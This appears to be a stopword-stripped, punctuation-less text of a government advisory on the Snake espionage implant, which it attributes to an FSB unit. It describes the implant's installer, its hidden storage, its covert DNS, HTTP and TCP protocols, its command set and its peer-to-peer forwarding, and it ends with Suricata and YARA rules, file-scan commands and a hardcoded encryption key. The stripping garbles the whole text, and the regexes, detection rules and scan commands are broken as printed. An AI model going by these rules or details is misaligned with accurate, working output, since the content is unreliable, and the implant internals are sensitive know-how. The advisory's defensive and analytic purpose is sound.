personal interests taunts directed security researchers instance ur0bursgotyou string referenced replaced glass d1ck 2014 following public cybersecurity reporting attribution attribute snake operations known unit within center 16 fsb unit broadly operates numerous elements turla toolset subunits spread throughout russia reflection historical kgb signals intelligence operations soviet union snake core component units operations almost long center 16 part fsb extensive influence snake across turla toolset demonstrates impact practically every aspect units modern era cyber operations daily operations using snake carried fsb facility ryazan russia increase snake activity fsb working hours ryazan approximately 700 800 pm moscow standard time gmt3 main developers ryazanbased fsb officers known monikers included code versions snake addition developing snake ryazanbased fsb officers used conduct worldwide operations operations different others launched moscow fsb sites based infrastructure techniques development retooling snake historically done ryazanbased fsb officers snake operations also launched fsb center 16occupied building moscow investigations identified examples fsb operators using snake full potential well fsb operators appeared unfamiliar snakes advanced capabilities observations serve illustrate difficulty using advanced toolset across various geographically dispersed teams comprising unit within fsb center 16 collectively investigating snake snakerelated tools almost 20 years well operations unit since 1990s time fsb used snake many different operations demonstrated value placed tool making numerous adjustments revisions keep viable repeated public disclosures mitigations snakes code multiple snakerelated tools either starting point key influence factor diverse range highly prolific implants operational tools turla family notably included carbon aka cobraderived snakes code baseand similarly snakeadjacent implant chinch currently known open sources comrat victimization identified snake infrastructure 50 countries across north america south america europe africa asia australia include united states russia although snake leverages infrastructure across industries targeting purposeful tactical nature instance infected system respond snake communications fsb actors would strategically reinfect within days globally fsb used snake collect sensitive intelligence high priority targets government networks research facilities journalists one example fsb actors used snake access exfiltrate sensitive international relations documents well diplomatic communications victim nato country within united states fsb victimized industries including education small businesses media organizations well critical infrastructure sectors including government facilities financial services critical manufacturing communications tools ttps employed snake fsb typically deploys snake externalfacing infrastructure nodes network uses tools ttps internal network conduct additional exploitation operations upon gaining cementing ingress target network fsb typically enumerates network works obtain administrator credentials access domain controllers wide array mechanisms employed gather user administrator credentials order expand laterally across network include keyloggers network sniffers open source tools typically fsb operators map network obtain administrator credentials various domains network regular collection operations begin instances snake heavyweight implants deployed rely credentials lightweight remoteaccess tools internally within network fsb operators sometimes deploy small remote reverse shell along snake enable interactive operations triggerable reverse shell fsb used around 20 years used backup access vector maintain minimal presence network avoid detection moving laterally snake architecture snakes architectural design reflects professional software engineering practices critical pathways within implant made stacks loosely coupled components implement welldesigned interfaces addition facilitating software development debugging construction allows snake use multiple different components purpose choosing specific component based environmental considerations example snakes custom network communications protocols function stack implementations use encryption layer transport layer snakes custom http raw tcp socket protocol layer snake network protocol stack solely implements specified interface operability two adjacent layers encryption layer underlying transport layer thus function independently custom snake network protocol employ encryption overlay without change encryption layer code modularity allows snake operators choose logical network transport given environment without affecting snakes functionality using compromised http server part snake p2p network operators ensure traffic machine follows snake custom http protocol thereby blends effectively legitimate traffic context compromised machine legitimately allows secure shell ssh connections snake utilize custom raw tcp socket protocol instead custom http protocol layers snake protocol stack immediately adjacent transport encryption layer distant command processing layer remain entirely agnostic transport layer long implements interface correctly architecture also allows snake developers easily substitute new communications protocol believe one compromised without necessitating downstream changes code base lastly design facilitates development fully interoperable snake implants running different host operating systems snakes technical sophistication extends software architecture lowerlevel software implementation original versions snake developed early 2003 many modern programming languages frameworks facilitate type modular development available snake written entirely c provides significant advantages lowlevel control efficiency provide direct support objects interfaces language level provides assistance memory management developers snake successfully implemented implants complex design c bugs including careful avoidance common pitfalls associated nullterminated strings mixing signed unsigned integers additionally developers demonstrate understanding computer science principles throughout implants implementation includes selecting correctly coding asymptotically optimal algorithms designing utilizing efficient custom encoding methodologies closely resemble common encoding schemes handling numerous possible errors associated systemslevel programming secure manner capitalizing mistakes although snake implant whole highly sophisticated espionage tool escape human error tool like snake requires familiarity expertise use correctly several instances snake operators neglected use designed various mistakes development operation provided us foothold inner workings snake key factors development capabilities allowed tracking snake manipulation data fsb used openssl library handle diffiehellman key exchange diffiehellman keyset created snake key exchange short secure fsb provided function dhgenerateparameters prime length 128 bits inadequate asymmetric key systems also instances appeared rushed deployments snake operators neglected strip snake binary led discovery numerous function names cleartext strings developer comments seen following figure snake hostbased technical details fsb quickly adapted snake capabilities publicly disclosed private industry snake therefore exists several variants evolved almost 20 years csa focuses one recent variants snake widely disclosed older variants snake discussed briefly applicable discussed depth many details earlier snake variants already exist public domain installer snake installer gone various names throughout snakes existence eg jpinstexe advisory describe version installer regularly used name jpsetupexe executable packed using customized obfuscation methodology developers appear added unpacking functionality open source project viewing jpeg files technique serves obfuscate unpacking code within otherwise legitimate code base unpacking code extracts executable herein referred png exe extracts aes encrypted blob png exes resources herein referred png resource jpsetupexe installer requires two arguments passed via command line execution first argument wide character string hashed sha256 twice resulting value computations becomes aes key decrypts png resource aes initialization vector iv consists first 16 bytes second argument jpsetupexe prepending argument wide character 1 string decrypted png resource becomes executable referred herein stage 2 unpacked many components extracted stage 2s resources several resources executables additional resources stage 2 creates structures resources ultimately become host artifacts snake ondisk components windows prevalent operating system targeted snake document discuss windowsbased artifacts however snake crosscompiled capable running operating systems ondisk obfuscation snakes host architecture network communications allow unusual level stealth snake makes inventive use kernel module contexts known windows versions snake used concealed storage mechanism hide host componentry addition using kernel module remove relevant components listing returned operating system snake utilizes kernel module mediate requests snakes user mode components concealed storage mechanism encrypted unique perimplant key unique keying creates detection difficulties even tools independent compromised operating system since simple signatures targeting snake host components would ineffective persistence mechanism snake version primarily discussed advisory registers service maintain persistence system typically service named werfaultsvc assess used blend legitimate windows service wersvc boot service execute snakes werfaultexe snake developers chose hide among numerous valid windows werfaultexe files windowswinsxs directory executing werfaultexe start process decrypting snakes components loading memory encrypted registry key data upon execution snakes werfaultexe attempt decrypt encrypted blob within windows registry typically found hklmsoftwareclasseswavopenwithprogids encrypted data includes aes key iv path used find decrypt file containing snakes kernel driver kernel driver loader registry objects structure seen right side following figure snake uses microsoft windows cryptography api next generation cng key store store aes key needed decrypt registry object kernel driver custom loader snakes installer drops kernel driver custom dll used load driver single aes encrypted file disk typically file named comadmindat stored windowssystem32com directory structure file seen left side figure key iv path comadmindat stored encrypted registry blob queue file last hostbased artifact discuss queue file typically file found within windowsregistration directory format randomguidrandomguidcrmlog decrypted snakes kernel driver due complexity importance queue file details discussed length following subsection queue queue snake structure contains various pieces information including key material communication channels modes operation principal user mode component etc snake requires successful operation noted name used developers equivalent queue normal context computer science queue data saved disk queue file flat file substructure includes 0x2cbyte file header followed data blocks data block corresponds exactly one queue item could example simple configuration parameter snake command entire embedded executable queue item associated specific queue container queue containers items container identified type instance values container type holds type information used snake implant specific purpose following table shows various container types functions queue multiple containers type containers different instance values data container queue separated queue items 0x40byte metadata structure shown following table data content queue item immediately follows structure queue items container distinguished corresponding item number well item type identifier item number assigned snake implant snake operators generally refer item type value trying reference specific item queue file encryption previous versions snake queue file existed within encrypted covert store data belonging queue items also cast128 encrypted recent versions covert store removed queue file exists disk queue items inside queue file still encrypted cast128 addition full queue file also cast128 encrypted cast keys used encrypt queue items within container instance found instances corresponding 0x2 container item type 0x229 see key iv used encrypt queue file found decoding strings within snakes kernel driver container descriptions 0xb container 0xb container lists available modes operation given snake implant using certain mode snake uses specific set containers communication channels infection use four different modes mode 0xb container container instance value containers associated mode use except 0x3 container 0x0 container 0x0 container handles incoming commandsdata host snake infection commands queued container implant ready execute 0x1 container 0x1 container handles outbound commandsdata host snake infection data queued within 0x1 container implant ready exfiltrate 0x2 container 0x2 container holds configuration information mode corresponds various pieces information vital snakes successful operation stored within containers subsection discuss subset parameters found within 0x2 container pivotal key information found within 0x2 containers includes inbound outbound rsa keys items 0x228 0x227 respectively cast key item 0x229 used encrypt individual items within queue container preshared keys used top layer encryption snakes network communication protocol quasiunique value implant called ustart value needed snake network connectivity snake constantly passing data kernel user mode components methodology generally named pipes used make communications listed items 0x650x6f 0x2 container items 0x700x7a list parameters necessary establish communications items 0xc90xd3 contain details ten snake infections referred communication channels implant communicate passive operations parameters needed establish snake sessions hosts found items 0xd40xde many additional data points process name snake injected modules snake loaded 0x3 container found within 0x2 containers 0x3 container 0x3 container houses embedded files modules snake single 0x3 container accessible containers queue 0x3 container dedicated 0x2 container includes single queue item item type 0x229 cast128 key key used encrypt decrypt embedded files modules within 0x3 container item types assigned embedded files modules within 0x3 container consistent across snake infections within snakes p2p network example 0x01 item type zlib library therefore time item type 0x01 seen within 0x3 container snake infection file always zlib library implants 0x2 container keep track libraries loaded dll file disk full path dll saved 0x2 container library loaded 0x3 container loaded module displayed implants 0x2 container format item type within 3 container loaded module 0x4 container 0x4 container logs command activity queue item within container log single executed attempted command mode corresponding 0x4 container 0x5 container 0x5 container holds snake network logs noting ip address connected implant versions snake longer make use container 0x6 container 0x6 container saves commands set execute specific times queue item created scheduled command 0x7 container 0x7 container logs ip addresses snake implants connected implant passive operations commands 0x79 read agents track 0x7a clear agents track used interact container note command 0x7a deprecated versions snake returns error function unsupported called snake network communications snakes network communications encrypted fragmented sent using custom methodologies ride common network protocols including raw tcp udp sockets higherlevel protocols like http smtp dns snakes protocols http tcp commonly seen functionality exists udp icmp raw ip traffic snakes network communications comprised sessions distinct sessions associated legitimate protocol riding top eg tcp sessions snake session comprised distinct commands snakes custom transport encryption layer enc snakes application layer encryption mechanisms enc layer operates individual p2p session snake application layer provides endtoend encryption controller ie point origin commands ultimate destination following figure details snakes communication protocol stack network obfuscation snakes use kernel module also facilitates stealthy network communications participate fully snakes p2p network implanted machines ultimate target must act servers snake nodes snakes kernel module along thoughtfully designed mechanism distinguishing snake traffic legitimate client traffic allows implant function server snake p2p network without opening new ports greatly complicating detection efforts additionally snakes custom network communication protocols designed blend traffic compromised server normally would receive allows snake operators use legitimate servers infrastructure reduces effectiveness simple ip address domain blocking without needing open new ports send unusual looking traffic infrastructure snakes network authentication technique ustart snake uses custom http raw socket tcp based protocols large data communications protocols others snake employs specific authentication mechanism distinguish snake traffic legitimate traffic destined application software compromised server technique enables one uniquely sophisticated aspects snake ability function effectively server software without opening ports compromised system relevant perimplant authentication value referred ustart stored implants queue file multiple forms ustart value including ustart ustart2 ustartl rather open listening socket specified tcp port snake kernel module intercepts first clienttoserver packet following 3way handshake every tcp session kernel module determines whether contents packet fact valid ustart value target snake implant snake kernel module forwards packet future packets tcp session snakes processing functionality presumably legitimate application listening port remains unaware tcp session snake kernel module allows packetand rest tcp session occursto reach legitimate listening application example web server software see following illustration ustart versions perform authentication sending random nonce along data comprises mathematical operation combination nonce ustart value receiving machine extracts nonce performs computations authenticate sending machine ustart2 ustartl versions use fowlernollvo fnv hash algorithm generate overall authentication value nonce ustart mechanism slightly different custom snake http protocol versus custom snake tcp protocol using ustart methodology node snake p2p network function server without opening otherwise closed ports without interfering compromised servers legitimate functionality snake communicate tcp ports another application actively listening technique makes detecting snake compromises network traffic monitoring far difficult inbound traffic unexpected tcp port detected blocked using standard firewall network intrusion detection functionality replacing legitimate service application modified executable lead detection either host network level snakes technique bypasses mitigations combined fact snake traffic looks similar expected traffic especially case snakes http based protocols renders detecting snake communications difficult absent detailed knowledge snakes custom protocols snake udp outbound communications via dns query snake uses specialized communications protocol encode information seemingly standard dns queries run via windows posix api function gethostbyname depending versionsnake outbound dns requests consist character strings constructed resemble standard domain names actual information transmitted implant contained part character string prior first character illustration purposes subsection outline arbitrary string bytes manipulated encoded form outbound snake dns request carrying data provided implant snake outbound dns requests originally take form byte arrays stored stack implant progresses communications function byte array following structure loworder seven bits flags byte used following significance calculating obfuscating byte array values shown snake encodes byte values defacto base32 text using ten digits 09 26 lowercase ascii letters az v w x z corresponding value 32 distinct characters needed snake inserts characters specified locations sends dns request using gethostbyname function resulting encoded string mimics legitimate dns request characters first part implants communications arbitrary suffix eg com used inbound communications via dns query response sending encoded dns request snake parses returned information normal dns request returned hostent structure contains list ipv4 addresses 32bit unsigned integers domain resolves one ipv4 addresses snake dns protocol 32bit integers represent covert channel data snake implant sorts 32bit integers highest order nibble interprets remaining 28 bits integer actual encoded data snake dns protocol thus provides wellconcealed lowbandwidth communications channel larger bandwidth communications snake uses custom http tcp protocols snake http common custom protocol snake uses http protocol rides top standard http generally looks like normal http communications including lot base64looking strings thus blending well normal network traffic multiple iterations snakes http protocol though differences encoding peeled away underlying snake http protocol purposes document snakes former version http referred http recent version http2 snake communications using http2 contained within seemingly legitimate application layer http communications clienttoserver direction implant data contained within http header field get request unless data certain size usually 256 bytes configurable observed field keys included authdata cacheauth cookie cockie note misspelling list exhaustive standard http header field used communication contained legitimate http header fields value meaning content following character whitespace immediately thereafter http get requests implant generally uses default path required configurablelarger clienttoserver snake http2 requests contained body http post request servertoclient communications contained body http response clienttoserver snake http http2 requests begin ustart authentication specifics vary ustart version case random nonce computed function nonce ustart value encoded manner closely resembles rest snake communication since snake http http2 implant sessions span multiple tcp sessions ustart authentication mechanism included every clienttoserver communication base62 encoding snakes http2 protocol uses custom base62 encoding scheme following differences base64 base62 uses 62 semantically significant characters instead 64 ratio encodedtodecoded characters base62 less dense 118 ratio base64 achieve 129 also base62 uses extraneous characters certain instances semantic significance base62 characters semantic significance 62 strict alphanumeric characters09azaz extraneous characters present base62 stringbut semantic significanceare underscore present characters removed prior performing decoding process valid base62 string 11 extraneous characters regular expression base62 included mitigations section csa http http2 metadata structure base62 decoding completed necessary remaining data begins 8byte metadata structure provides rudimentary sessionization top stateless http snakes http http2 clienttoserver communications three defacto parts concatenated single http header value parts 1 announce authentication string 2 custom metadata structure 3 payload data metadata structure consists following struct httpmeta uint32t sessionnumber uint16t communicationnumber uint8t flags uint8t checksum snake uses sessionnumber communicationnumber fields provide custom sessionization top stateless application layer http protocol checksum byte serves validate integrity structure must equal sum first seven bytes modulo 256 snake tcp snake ability communicate posixstyle tcp sockets implants custom tcp protocol herein called tcp uses reliability features underlying tcp protocol thus implants custom tcp protocol concept tcp session implant session whereas implants custom http protocols one implant session could span multiple transport layer tcp sessions since implants overall communications protocol based idea commands responses snake depends able specify length given command response recipient snake node knows particular communication ends snake achieves custom tcp protocol prefacing communication length encoded 32bit bigendian unsigned integer immediately following tcp 3way handshake implant completes ustart authentication session since snake tcp sessions mapped onetoone underlying protocol tcp session ustart authentication occurs per session rather clienttoserver communication snake http http2 snake tcp ustart mechanism similar snake http http2 mechanisms except certain ustart versions snake tcp uses raw binary ustart encoded printable characters ustart authentication implant begin sending lengthdata pairs pairs sent packet two theoretically separate packets pattern lengthdata pairs present half stream ie direction entirety implant communications remainder tcp session specifically lengthdata pair consist length encoded bigendian 32bit unsigned integer followed data exactly length example consider instance implant sending following 4 arbitrary bytes 89 ab cd ef onwire communication implant would send integer value 4 encoded bigendian 32bit integer followed actual 4 bytes shown could split across two theoretically packets 00 00 00 04 89 ab cd ef custom tcp protocol well custom http protocols used conjunction snake enc protocol details snake enc protocol provided following subsection due manner snake enc snake tcp protocols interact first six lengthdata pairs tcp halfstream following single clienttoserver announce authentication packet described known lengths specifically halfstream begin lengthdata pairs following lengths 0x8 0x4 0x10 0x1 0x10 0x10 note lengths raw data communication preceded 4byte bigendian integer specifying corresponding length thus one halfstreams could following tcp content 00 00 00 08 12 34 56 78 9a bc de f0 00 00 00 04 89 ab cd ef 00 00 00 10 12 34 56 78 9a bc de f0 12 34 56 78 9a bc de f0 00 00 00 01 12 00 00 00 10 12 34 56 78 9a bc de f0 12 34 56 78 9a bc de f0 00 00 00 10 12 34 56 78 9a bc de f0 12 34 56 78 9a bc de f0 snake enc layer described snake communications comprised snake sessions irrespective whichever legitimate protocol snake operating top snakes top layer encryption called enc layer utilizes multistep process establish unique session key session key formed combination diffiehellman key exchange mixed preshared key psk known parties psk stored one communication channels stored within queue overall establishment session key requires 12 communication steps six direction involve sharing pseudorandom values used diffiehellman exchange process well custom aspects snake session key derivation method session key used encrypt command headers inner encrypted payloads layer critical error providing value 128 bits instead 128 bytes call dhgenerateparameters within openssl library occurred due insufficient key length breaking diffiehellman portion exchange possible note following figure variables p g b used standard descriptions diffiehellman snake application layer snakes application layer used process snake commands payload data snake session contain one command exchanges include incoming data sent implant well response returned server command associated specific ordinal due snakes modular design operators able add new commands extend snakes capabilities remotely loading new module snake implant differentiates high low commands handles differently based ordinal number range majority snake commands high commands ordinal 0x64 100 decimal higher far fewer low commands include forwarding command ordinal 0x1 four queue commands ordinals 0xa 0xb 0xc 0xd low commands mostly used moving data across network high commands give operator many options interacting infected system command 0x15byte header commands begin 0x15byte header followed optional command parameter data commands require parameters successful execution example command get exfiltrates file requires name file exfiltrate whereas command process list returns process listing require parameters important command header field contains integer ordinal command sent item uid field represents unique identifier individual command instance values increase sequentially header two fields used command set run specified date time commands written 0x6 container low commands another header payload data detailed commands command header followed encrypted parameter data command encryption underneath snake http2 tcp encryption session layer command exchange encrypted older versions snake exchanges cast128 encrypted using different key incoming outgoing data keys saved 0x2 container 0x227 0x228 items incoming payload data parameter data present could decrypted 0x227 cast key response data encrypted 0x228 cast key recent versions 0x227 0x228 items hold two rsa4096 public keys side exchange new 16byte cast key created microsofts cryptoapi cryptgenrandom function obtain 16 random bytes key used cast128 encrypt parameter response data incoming command cast key signed encrypted private key corresponding public key node create 512byte rsa data blob incoming payload rsa blob followed optional parameter data cast128 encrypted snake uses 0x227 rsa public key decrypt rsa blob recover cast key decrypt parameter data outgoing command new cast key obtained cryptgenrandom response data cast128 encrypted key encrypted using 0x228 public key create 512byte data blob response payload data contains 512byte rsa blob followed encrypted response data present command decoding implant expect data specific format command ordinal parameter response data contain several possible underlying data types including widecharacter plaintext strings numeric values data tables files combination multiple types parameter data buffer formatted specific way depending command ordinal commands required parameters well optional parameters commands optional parameters include metadata header data length data type eg bool integer text data buffer optional parameters data commands expect parameters formatted lengthdata pairs consisting parameter data length encoded fourbyte bigendian integer followed data exactly length still commands custom header expect length metadata simply send parameter data alone response data similarly formatted implant specific way according command ordinal response data typically length metadata preceding exception data tables examples commands return table process list command list dir command response data includes table start table description header indicates number columns rows table addition header include column descriptor structure indicate type data column contain example string uint32 uint64 timestamp epoch format contents whole file included table entry table description header field added data payload buffer one time lengthdata pair fields across first row added order fields across second row added immediately first row metadata separation parse table server account number columns determine next row starts high commands high commands ordinal 0x64 decimal 100 higher high commands give operator many options interacting infected system well implant components subsection describe examples many high commands exist implant basic high commands gather information machine return results example fsb operators use ps command 0x65 return list running processes list dir command 0x840 list contents directory syst command 0x6b gather basic system information several commands interact infected machine using standard builtin os tools operator use kill command 0x67 kill process get command 0x68 exfiltrate file put command 0x69 write file del command 0x6a delete file run command 0x66 execute command terminal shell receive results example operators used run command run powershell commands ping hosts use windows net use command map network drives run executable files previously written node using put command addition commands use builtin os functionality several high commands interact snake components operator use read config command 0x70 read 0x2 container contains configuration data set config item command 0x71 set specific queue item within 0x2 container example operators used set config item command add update ip addresses domains option parameters used communicate snake nodes read agents track clear agents track commands 0x79 0x7a interact 0x7 container read delete logs track snake nodes connected node note 0x7a command deprecated versions snake returns error function unsupported called snake ability add additional commands loading new modules new modules loaded using load modules command 0x72 directly memory using load modules mem command 0x7f compiling module developer assign ordinal constituent command used operator call newly added commands loaded modules removed using module unload command 0x73 queue commands queue command header four queue commands contain 0x3dbyte queue header following command header recent versions snake header encrypted using cast key used encrypt payload data case command header followed 512byte rsa encrypted cast key blob encrypted queue header finally encrypted payload data even though four queue commands use subset fields queue header different ways full header must present command considered valid implant two fields header four queue commands use container instance container type fields indicate specific container node queue command intends interact queue read write commands item type field used track specific commands responses containers queue enumerate command queue enumerate command ordinal 0xa used enumerate contents 0x0 0x1 containers list incoming outgoing commands respectively enumeration returns 0x40byte structure described queue item concatenated single return buffer queue read command queue read command ordinal 0xb used read item specified 0x0 0x1 container several relevant fields queue header determine data sent stored example header determines whether data sent immediately back server stored later transport header indicates implant send queue items header ie 0x40byte metadata structure returned 0xa command items data header also indicates whether queue item deleted read also indicate queue items lower item type deleted allows fsb operators clear command items previous one read queue write command queue write command ordinal 0xc used write queue item specified 0x0 0x1 container queue header indicate new queue item created existing queue item modified queue item set modified item specified item type must exist specified container several fields header must match specific attributes existing queue item checks met parameter data written queue item fields queue header indicate length data written offset existing queue item write beginif queue item set created snake delete existing queue items specified item type container interest create new item specified item type write parameter data queue item field queue header indicate length data written queue delete command queue delete command ordinal 0xd used delete queue item specified 0x0 0x1 container flags field determine single queue item deleted queue items lower item type deleted well forward commands forward commands command ordinal 0x1 used tell implant forward snake command second target node command executed target node sends response data back first implant package response data response back caller command designed tell implant forward one command another implant practice forward commands often built top create chain hop points continue forward command end point executed response data sent back chain hop points reaches operator forward command 0x199byte forward header followed encrypted command parameter data sent target node forward command forward header contains information implant need connect target node including ordinal snake command forwarded target node execution implant receives forward command construct new snake command ordinal indicated forward header connect target node new session construct command header send encrypted command parameter data target node parameter data already encrypted using key associated target node target implant able decrypt parameter data execute command forward command constructed cast key used cast128 encrypt payload datato include 0x199byte header parameter data forwardedis encrypted rsa key pair used first implant parameter data contains parameters command forwarded also cast128 encrypted key used encrypt parameter data encrypted rsa key pair used target node first implant knows header command ordinal forwarding unable decrypt parameter data forward header sent first implant indicates command forwarded another forward command first target node decrypt parameter data find another forward header first target node implant go process connect next target node constructing new command ordinal indicated second forward header send remaining encrypted parameter data next target node repeat command forwarded something another forward command command header pertinent parameters target node encrypted specifically node operator forward command sent snake p2p network illustrate diagram shows buffer might look several forward commands chained together include two hop points end point first hop point hp1 recover first cast key cast128 decrypt rest buffer uncover first forward header hp1 forward remainder decrypted buffer next hop point hp2 starting second cast key blob hp2 recover second cast key cast128 decrypt rest buffer uncover second forward header hp2 forward remainder decrypted buffer end point starting third cast key blob end point recover cast key decrypt command parameter data execute command target machine executed forwarded command return data encrypted implants rsa keys returned directly previous hop point data returned chain snake p2p network intermediate hop points manipulate encrypted data rsa private key necessary manner return data defacto endtoend encrypted throughout p2p network arrives back fsb operator snake implant operation snake uses two main methods communication command execution namely passive active general snake operators employ active operations communicate hop points within snakes infrastructure however hop points sometimes operate using snakes passive method snakes end points tend solely operate using passive method active operations active operations snake commands issued fsb operator script target machine generally forward commands described previous section response command immediately returned point origin following path command took reach end target shown previous figure forward command structure passive operations passive operations snake implants operate without synchronous interaction fsb operators nodes implant communicates passive operations stored within 0x2 containers communication channels ten communication channels present time operator change channels via set config item command passive intake passive operations implant beacon sending queue read 0xb command one stored communication channels chosen random queue read commands look queue item within container instance number equal implants uid matching uid indicates queue items container intended beaconing implant queue item found beaconing implant read queue item delete host read multiple queue items found within specified queue container beaconed queue read command read one items process repeated items within container read infrastructure node indicate sending specific error response queue read beaconing continue randomly select hosts nondeterministic time intervals long implant set perform passive operations passive data exfiltration similar snake intakes commands passively also exfiltrate resulting data passively done using queue write 0xc commands write one stored communication channels chosen random data end point node operators generally retrieve manually using script item type field unique per executed snake command needed associate exfiltrated data target node command run context passive snake communications term item type defined uid given snake command resulting data item type serves unique identifier associate results command execution original command written operator fsb collects data snake knows exactly infection data came therefore determine key use successfully decrypt data illustrate passive operations conducted end points operator hop points see diagram explained following steps 1 2 passive operations node randomly chooses host amongst stored communication channels beacon queue read command hop point 1 case item type beacons one greater item type last command received node indicating example command item type 0x08 last command read node passive operations node continue beacon item type 0x09 receives command via passive operations item type 0x09 greater lines dotted 1 2 activity repeated random intervals successful queue read occurs 3 4 steps operator uses queue write command write command hop point ultimately intended node item type command written hop point 1 assigned 0x20 example note path command execution results making back operator tracked via red text 5 6 node continues beacon looking commands read 5 return 6 successful command written operator hop point 1 3 read node deleted hop point 1 7 8 node attempts another queue read hop point 1 however item type set 0x21 one greater command read node 5 6 returns error hop point 1 nothing else node read indicating node everything hop point 1 read 9 10 point node executed command read 5 6 attempting send back results node randomly selects another host stored communication channels hop point 2 case sends 0xb command make sure item type 0x20 item type command executed already exist within queue hop point 2 receives error item item type 0x20 hop point 2 node proceed send command results 11 12 data executed command written hop point 2 item type 0x20 0x1 container 0xc command item type command initially given creation 3 13 14 node continues normal beaconing routine seen 1 2 searching item type 0x21 one greater item type recently executed command 1 2 lines dotted denote process repeat successful beacon 5 6 1522 steps show operator retrieves resulting data written hop point 2 queue enumerate command 15 lists contents hop point 2s 0x1 container showing data written node 11 data identifiable item type namely 0x20 queue read command 17 reads item found hop point 2s container queue read command follows 19 asking data left case entirety data read first queue read 17 18 therefore error returned second queue read command 20 lets operator know data item type 0x20 read nothing queue delete command 21 follows sent delete item item type 0x20 hop point 2 subsequent queue read queue read queue delete commands 1721 denoted dashed lines indicate sequence commands repeated items returned queue enumerate command 15 mitigations number complementary detection techniques effectively identify recent variants snake however described snake purposebuilt avoid largescale detection discussion advantages disadvantages various detection methodologies available snake note techniques identified section affect availability stability system defenders follow organizational policies incident response best practices minimize risk operations hunting snake networkbased detection network intrusion detection systems nids feasibly identify recent variants snake custom network protocols detailed advantages highconfidence largescale networkwide detection custom snake communication protocols disadvantages low visibility snake implant operations encrypted data transit potential false positives snake http http2 tcp signatures snake operators easily change networkbased signatures snake http snake clienttoserver http http2 traffic contained within arbitrary http header field header field value http begins 10 pure alphanumeric characters followed base64 encoding 8 bytes yields exactly 11 valid base64 characters plus one base64 padding character 09azaz1009azaz11 following two suricata rules detect traffic described alert http msg http rule cookie pcre09azaz1009azaz11c flow established toserver sid 7 rev 1 alert http msg http rule header pcre09azaz1009azaz11h flow established toserver sid 8 rev 1 snake http2 header field value http2 begins 22 pure alphanumeric characters base62 nonextraneous characters followed base62 encoding least 8 bytes must comprise least 11 base62 characters four extraneous characters allowed actual requirement stricter expression since total number nonextraneous characters alone must equal exceed 11 however possible encode aspect regular language 09azaz2209azaz11 following two suricata rules detect traffic described alert http msg http2 rule cookie pcre09azaz2209azaz11c flow established toserver sid 9 rev 1 alert http msg http2 rule header pcre09azaz2209azaz11h flow established toserver sid 10 rev 1 snake tcp clienttoserver communication tcp must begin ustart captured signature set immediately following ustart next clienttoserver communication must bigendian 32bit unsigned integer 8 followed 8 bytes data next communication must also clienttoserver must comprise bigendian 32bit unsigned integer 4 followed 4 bytes data next two communications must servertoclient comprising integer 8 followed 8 bytes data integer 4 followed 4 bytes data following six suricata rules conjunction detect traffic form described alert tcp msg tcp rule content 00 00 00 08 startswith dsize 12 flow established toserver flowbits set a8 flowbits noalert sid 1 rev 1 alert tcp msg tcp rule content 00 00 00 04 startswith dsize8 flow established toserver flowbits isset a8 flowbits unset a8 flowbits set a4 flowbits noalert sid 2 rev 1 alert tcp msg tcp rule content 00 00 00 08 startswith dsize 4 flow established toclient flowbits isset a4 flowbits unset a4 flowbits set b81 flowbits noalert sid 3 rev 1 alert tcp msg tcp rule dsize 8 flow established toclient flowbits isset b81 flowbits unset b81 flowbits set b8 flowbits noalert sid 4 rev 1 alert tcp msg tcp rule content 00 00 00 04 startswith dsize 4 flow established toclient flowbits isset b8 flowbits unset b8 flowbits set b41 flowbits noalert sid 5 rev 1 alert tcp msg tcp rule dsize 4 flow established toclient flowbits isset b41 flowbits unset b41 sid 6 rev 1 hostbased detection advantages high confidence based totality positive hits hostbased artifacts disadvantages many artifacts host easily shifted exist different location different name files fully encrypted accurately identifying files difficult covert store detection snake covert store comprises filebacked ntfs usually fat16 rarely filesystem filesystem encrypted cast128 cbc mode encryption key either statically hardcoded dynamically stored specified windows registry location iv 8 bytes since cast128 8byte block length first byte iv 512byte block covert store 0indexed block number remaining bytes iv corresponding bytes key meaning bytes 0indexed indices 1 7 iv bytes 0indexed indices 1 7 key statically hardcoded encryption key following constant value a1 d2 10 b7 60 5e da 0f a1 65 af ef 79 c3 66 fa stored windows registry encryption key classname associated following key securitypolicysecretsn following initial 8byte sequences known used ntfs fat16 filesystems observed eb 52 90 4e 54 46 53 20 eb 5b 90 4e 54 46 53 20 eb 3c 90 4d 53 44 4f 53 eb 00 00 00 00 00 00 00 tool development following test vector illustrates encryption first given header eb 52 90 using cast128 default key shown iv constructed described given header occurs beginning first 512byte block covert store plaintext eb 52 90 4e 54 46 53 20 keya1 d2 10 b7 60 5e da 0f a1 65 af ef 79 c3 66 fa iv00 d2 10 b7 60 5e da 0fciphertextc2 c7 f4 ca f7 da 3a c8 encrypting possible initial filesystem byte sequence cast128 using key obtained registryor default encryption key registry entry existand searching file size even multiple 220 possible efficiently detect snake covert stores validation performed decrypting entire file using outlined methodology verifying comprises ntfs fat16 filesystem ondisk artifact detection registry blob registry blob generally found location listed case present typical location registry blob found searching full registry value least 0x1000 bytes size entropy least 79 typical name unknown regblob typical path hklmsoftwareclasseswavopenwithprogids characteristics high entropy queue file typical name randomguid randomguidcrmlog typical path windowsregistration unique characteristics high entropy file attributes hidden system archive role snake queue file snake queue file generally predictable path filename structure addition high entropy snake queue file located scanning files typical queue path filenames matching regular expression captures typical naming convention files meeting criteria scanned high entropy performed yara rule rule highentropy meta description entropy rule condition mathentropy0 filesize 70 following unix find command scan files names matching guidbased convention note highentropy yara rule assumed contained file named 1yar find pathtowindowsdir type f regextype posixegrep iregex registration09af809af4309af122crmlog exec yara 1yar following powershell command getchilditem recurse file path windows whereobject fullname match iregistration09af809af4309af122crmlog foreachobject yara 1yar fullname comadmin typical name comadmindat typical path windowssystem32com unique characteristics high entropy role houses snakes kernel driver drivers loader snake comadmin file found using analogous techniques presented locating snake queue file following unix find command find pathtowindows type f regextype posixegrep iregex system32comcomadmindat exec yara 1yar following powershell command getchilditem recurse file path windows whereobject fullname match isystem32comcomadmindat foreachobject yara 1yar fullname werfault typical name werfaultexetypical path windowswinsxsx86microsoftwindowserrorreportingfaults31bf3856ad364e3540960016384nonea13f7e283339a0502unique characteristics icon different valid windows werfaultexe filerole persistence mechanism snake werfaultexe file nonstandard icon sizes form basis yara rule rule run files typical path specifically windowswinsxs directory rule peiconsizes meta description werfault rule condition peispe rsrc peresources rsrctype peresourcetypeicon rsrclength 3240 rsrc peresources rsrctype peresourcetypeicon rsrclength 1384 rsrc peresources rsrctype peresourcetypeicon rsrclength 7336 memory analysis advantages high confidence memory provides greatest level visibility snakes behaviors artifacts disadvantages potential impact system stability difficult scalability capturing analyzing memory system effective approach detecting 